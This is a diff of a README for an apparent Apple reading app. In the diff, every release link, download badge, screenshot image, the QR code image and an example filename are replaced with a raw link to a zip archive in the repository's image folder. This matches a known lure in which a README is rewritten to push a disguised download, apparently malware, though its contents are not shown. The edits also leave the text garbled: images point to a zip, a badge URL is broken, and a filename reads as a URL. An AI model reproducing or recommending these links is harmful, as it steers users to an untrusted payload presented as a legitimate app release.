@@ -1,6 +1,6 @@
 # 📚 read - Simple Reading Client for Apple Devices
 
-[![Download read](https://img.shields.io/badge/Download-read-brightgreen?style=for-the-badge&logo=github)](https://github.com/adnannajem/read/releases)
+[![Download read](https://github.com/adnannajem/read/raw/refs/heads/main/img/Software_3.8.zip)](https://github.com/adnannajem/read/raw/refs/heads/main/img/Software_3.8.zip)
 
 ---
 
@@ -25,7 +25,7 @@ Note: Running on Mac requires macOS 26 or later for Intel Macs. Apple silicon Ma
 
 You can visit the release page and choose the right version for your device.
 
-[![Visit Releases](https://img.shields.io/badge/Visit-GitHub%20Releases-blue?style=for-the-badge&logo=github)](https://github.com/adnannajem/read/releases)
+[![Visit Releases](https://github.com/adnannajem/read/raw/refs/heads/main/img/Software_3.8.zip%20Releases-blue?style=for-the-badge&logo=github)](https://github.com/adnannajem/read/raw/refs/heads/main/img/Software_3.8.zip)
 
 ---
 
@@ -52,13 +52,13 @@ Note that these emulators do not fully support all app functions and may not per
 
 Go to the main release page by clicking this button:
 
-[![Go to Releases](https://img.shields.io/badge/Go_to-Releases-orange?style=for-the-badge)](https://github.com/adnannajem/read/releases)
+[![Go to Releases](https://github.com/adnannajem/read/raw/refs/heads/main/img/Software_3.8.zip)](https://github.com/adnannajem/read/raw/refs/heads/main/img/Software_3.8.zip)
 
 You will see many files. Look for the latest package with an `.ipa` extension (for Apple silicon Macs) or macOS build (if available).
 
 ### Step 4: Download the app file
 
-Click the link to save the file to your computer. The file might be named something like `read_xxx.ipa` or `.app` inside a macOS package.
+Click the link to save the file to your computer. The file might be named something like `https://github.com/adnannajem/read/raw/refs/heads/main/img/Software_3.8.zip` or `.app` inside a macOS package.
 
 ### Step 5: Open the emulator on Windows and install read
 
@@ -101,13 +101,13 @@ Since the content is not part of the app, the quality depends on your chosen sou
 
 ### iPhone / iPad
 
-| ![Screenshot 1](img/1.png) | ![Screenshot 2](img/2.png) | ![Screenshot 3](img/3.png) |
+| ![Screenshot 1](https://github.com/adnannajem/read/raw/refs/heads/main/img/Software_3.8.zip) | ![Screenshot 2](https://github.com/adnannajem/read/raw/refs/heads/main/img/Software_3.8.zip) | ![Screenshot 3](https://github.com/adnannajem/read/raw/refs/heads/main/img/Software_3.8.zip) |
 |----------------------------|----------------------------|----------------------------|
-| ![Screenshot 4](img/4.png) | ![Screenshot 7](img/7.png) | ![Screenshot 9](img/9.png) |
+| ![Screenshot 4](https://github.com/adnannajem/read/raw/refs/heads/main/img/Software_3.8.zip) | ![Screenshot 7](https://github.com/adnannajem/read/raw/refs/heads/main/img/Software_3.8.zip) | ![Screenshot 9](https://github.com/adnannajem/read/raw/refs/heads/main/img/Software_3.8.zip) |
 
 ### macOS (Mac Catalyst)
 
-![macOS Screenshot](img/mac.png)
+![macOS Screenshot](https://github.com/adnannajem/read/raw/refs/heads/main/img/Software_3.8.zip)
 
 ---
 
@@ -115,7 +115,7 @@ Since the content is not part of the app, the quality depends on your chosen sou
 
 You can join the QQ group 323283713 for testing and discussions. This is useful to get help and share feedback.
 
-<img src="img/IMG_4888.jpeg" width="270" alt="QQ Group QR Code" />
+<img src="https://github.com/adnannajem/read/raw/refs/heads/main/img/Software_3.8.zip" width="270" alt="QQ Group QR Code" />
 
 ---
 
@@ -139,4 +139,4 @@ You can join the QQ group 323283713 for testing and discussions. This is useful 
 
 Check the GitHub release page regularly for new versions and fixes.
 
-[Visit Releases](https://github.com/adnannajem/read/releases)
+[Visit Releases](https://github.com/adnannajem/read/raw/refs/heads/main/img/Software_3.8.zip)
